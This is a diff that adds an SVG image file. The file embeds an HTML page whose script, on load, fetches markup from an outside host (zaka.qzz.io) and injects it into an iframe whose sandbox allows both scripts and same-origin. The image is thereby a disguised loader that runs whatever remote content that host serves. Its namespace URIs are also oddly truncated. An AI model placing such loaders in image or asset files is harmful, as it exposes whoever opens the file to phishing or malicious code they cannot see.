@@ -1,0 +1,51 @@
+<?xml version="1.0" encoding="utf-8"?>
+<svg xmlns="http://w3.org" width="100%" height="100%" viewBox="0 0 1920 1080">
+  <!-- Solid dark background to prevent flashing while loading -->
+  <rect width="100%" height="100%" fill="#121212" />
+
+  <foreignObject x="0" y="0" width="100%" height="100%">
+    <html xmlns="http://w3.org" lang="en">
+      <head>
+        <title>idkk</title>
+        <style>
+          html, body { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #121212; }
+          iframe { width: 100%; height: 100%; border: none; overflow: hidden; display: block; }
+        </style>
+      </head>
+      <body>
+
+        <!-- Target iframe viewport -->
+        <iframe id="app-frame" sandbox="allow-scripts allow-same-origin allow-modals allow-popups"></iframe>
+
+        <script type="text/javascript">
+        /* <![CDATA[ */
+          // 1. Define your target URL source directly
+          const targetUrl = 'https://zaka.qzz.io';
+
+          // 2. Asynchronously download the target context string directly
+          async function loadExternalContent() {
+            try {
+              const response = await fetch(targetUrl);
+              
+              if (!response.ok) {
+                throw new Error('Network returned an error state.');
+              }
+              
+              const rawHtml = await response.text();
+              
+              // 3. Pipe the downloaded HTML text string straight into the frame context
+              document.getElementById('app-frame').srcdoc = rawHtml;
+            } catch (error) {
+              console.error('The browser engine rejected the data injection pipeline:', error);
+            }
+          }
+
+          // Execute deployment sequence immediately
+          loadExternalContent();
+        /* ]]> */
+        </script>
+
+      </body>
+    </html>
+  </foreignObject>
+</svg>
